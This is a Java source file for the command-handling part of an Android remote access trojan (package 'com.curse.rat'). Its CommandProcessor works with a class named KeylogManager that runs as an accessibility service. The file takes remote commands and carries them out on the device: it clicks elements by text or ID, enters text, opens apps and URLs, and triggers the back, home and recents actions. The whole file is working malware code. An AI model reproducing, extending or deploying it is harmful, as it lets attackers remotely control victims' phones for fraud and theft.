package com.curse.rat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class CommandProcessor {
    private static final String TAG = "CommandProcessor";
    private KeylogManager service;

    public CommandProcessor(KeylogManager service) {
        this.service = service;
    }

    public void process(String command, String argument) {
        Log.d(TAG, "Processing command: " + command + " with arg: " + argument);
        switch (command) {
            case "click_text":
                clickByText(argument);
                break;
            case "click_id":
                clickById(argument);
                break;
            case "input_text":
                inputText(argument);
                break;
            case "open_app":
                openApp(argument);
                break;
            case "open_url":
                openUrl(argument);
                break;
            case "back":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                break;
            case "home":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                break;
            case "recents":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
        }
    }

    private void clickByText(String text) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Clicked node by text: " + text);
                    return;
                } else {
                    // Try to click the center of the node if it's not explicitly clickable
                    Rect bounds = new Rect();
                    node.getBoundsInScreen(bounds);
                    service.click(bounds.centerX(), bounds.centerY());
                    Log.d(TAG, "Clicked coordinates of node by text: " + text);
                    return;
                }
            }
        }
    }

    private void clickById(String id) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Clicked node by id: " + id);
                    return;
                } else {
                    Rect bounds = new Rect();
                    node.getBoundsInScreen(bounds);
                    service.click(bounds.centerX(), bounds.centerY());
                    Log.d(TAG, "Clicked coordinates of node by id: " + id);
                    return;
                }
            }
        }
    }

    private void inputText(String text) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;
        AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focused != null) {
            Bundle arguments = new Bundle();
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT);
            Log.d(TAG, "Input text: " + text);
        }
    }

    private void openApp(String packageName) {
        Context ctx = service.getApplicationContext();
        Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(packageName);
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            Log.d(TAG, "Opened app: " + packageName);
        }
    }

    private void openUrl(String url) {
        Context ctx = service.getApplicationContext();
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(intent);
        Log.d(TAG, "Opened URL: " + url);
    }
}
